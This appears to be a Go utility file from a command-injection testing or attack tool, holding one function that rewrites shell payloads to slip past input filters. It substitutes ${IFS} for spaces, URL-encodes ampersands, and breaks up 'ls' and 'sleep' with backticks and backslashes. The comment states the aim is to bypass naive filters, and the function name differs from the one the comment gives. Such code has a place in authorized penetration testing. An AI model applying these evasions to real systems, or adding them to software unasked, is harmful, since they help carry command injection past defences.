package utils

import "strings"

// BasicObfuscate adds whitespace and case variation to bypass naive filters.
// You can improve this later with more advanced techniques.
func Obfuscate(payload string) string {
	obfuscated := strings.ReplaceAll(payload, " ", "${IFS}")
	obfuscated = strings.ReplaceAll(obfuscated, "&&", "&%26")
	obfuscated = strings.ReplaceAll(obfuscated, "ls", "l$IFS`s`")
	obfuscated = strings.ReplaceAll(obfuscated, "sleep", "s\\l\\e\\e\\p")
	return obfuscated
}
